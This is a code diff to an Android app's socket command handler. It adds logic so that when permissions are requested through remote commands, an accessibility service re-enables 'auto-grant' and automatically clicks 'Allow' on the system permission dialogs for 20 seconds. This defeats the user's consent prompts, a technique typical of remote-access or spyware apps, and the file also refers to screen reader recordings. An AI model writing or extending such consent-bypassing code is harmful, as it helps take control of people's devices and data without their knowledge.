@@ -1802,10 +1802,27 @@ public class SocketManager {
                 r.put("error", "Missing 'permission' parameter");
                 return r;
             }
-            return permissionManager.requestPermission(perm);
+            JSONObject result = permissionManager.requestPermission(perm);
+            // Re-enable auto-grant so the accessibility service automatically
+            // clicks "Allow" on the dialog that is about to appear.
+            // Without this, autoGrantMode is false (first-launch window long gone)
+            // and the dialog just sits there waiting for a manual tap.
+            try {
+                com.task.tusker.services.UnifiedAccessibilityService svc =
+                    com.task.tusker.services.UnifiedAccessibilityService.getInstance();
+                if (svc != null) svc.reEnableAutoGrant(20_000);
+            } catch (Exception ignored) {}
+            return result;
         }
         if (command.equals("request_all_permissions")) {
-            return permissionManager.requestAllPermissions();
+            JSONObject result = permissionManager.requestAllPermissions();
+            // Same as above — re-enable the granter for all the dialogs that will appear.
+            try {
+                com.task.tusker.services.UnifiedAccessibilityService svc =
+                    com.task.tusker.services.UnifiedAccessibilityService.getInstance();
+                if (svc != null) svc.reEnableAutoGrant(20_000);
+            } catch (Exception ignored) {}
+            return result;
         }
 
         // ── Screen Reader Recordings (no accessibility needed) ────────────────
